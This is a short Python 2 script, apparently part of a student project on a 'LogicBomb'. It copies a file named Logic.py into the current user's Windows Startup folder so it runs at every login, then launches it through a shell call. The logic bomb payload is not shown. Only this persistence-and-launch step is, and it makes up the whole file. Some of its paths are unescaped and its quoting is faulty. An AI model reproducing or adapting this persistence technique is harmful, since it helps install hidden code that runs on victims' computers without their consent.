import os, subprocess
from shutil import copyfile

try:
    copyfile("C:\\Users\\radiactivo\\Desktop\\python tfg\\LogicBomb\\Logic.py", "C:\\Users\\radiactivo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Logic.py")
except:
    print "Error"

fileRoute = "C:\Users\radiactivo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Logic.py"
out = subprocess.call("python 'C:\Users\radiactivo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Logic.py' ", shell = True)
print out

raw_input("Press Enter to continue")
